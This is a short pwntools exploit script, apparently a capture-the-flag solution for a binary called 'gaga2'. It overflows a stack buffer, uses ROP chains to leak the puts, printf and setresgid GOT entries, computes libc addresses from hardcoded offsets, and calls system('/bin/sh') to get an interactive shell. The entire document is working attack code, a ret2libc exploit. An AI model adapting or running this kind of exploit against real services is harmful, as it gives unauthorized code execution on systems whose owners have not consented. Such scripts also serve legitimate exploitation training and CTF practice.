from pwn import *

POP_RDI = 0x4012b3
PUTS_PLT = 0x401090
MAIN = 0x4011d6
RET = 0x40124a
PUTS_GOT = 0x404018
SETRESGID_GOT = 0x404020
PRINTF_GOT = 0x404030

def leak(address):
    rop = p64(POP_RDI)
    rop += p64(address)
    rop += p64(PUTS_PLT)
    rop += p64(MAIN)
    r.sendline(b'A' * 0x48 + rop)
    x = r.recvuntil(b"Your input: ")
    return u64(x[:6] + b'\0\0')

def shell(system, binsh):
    rop = p64(POP_RDI)
    rop += p64(binsh)
    rop += p64(RET)  # Stack alignment
    rop += p64(system)
    r.sendline(b'A' * 0x48 + rop)
    r.interactive()

if args['REMOTE']:
    r = remote('127.0.0.1', 5000)
    PRINTF_OFFSET = 0x61c90
    SYSTEM_OFFSET = 0x52290
    BINSH_OFFSET = 0x1b45bd
else:
    r = process('./gaga2')
    input("Attach a debugger? ")
    PRINTF_OFFSET = 0x525b0
    SYSTEM_OFFSET = 0x4c490
    BINSH_OFFSET = 0x196031

r.recvuntil(b'Your input: ')

puts = leak(PUTS_GOT)
log.info(f"puts @ 0x{puts:x}")
printf = leak(PRINTF_GOT)
log.info(f"printf @ 0x{printf:x}")
setresgid = leak(SETRESGID_GOT)
log.info(f"setresgid @ 0x{setresgid:x}")
log.info("Use a libc database to get the system offset")

libc = printf - PRINTF_OFFSET
system = libc + SYSTEM_OFFSET
binsh = libc + BINSH_OFFSET

shell(system, binsh)
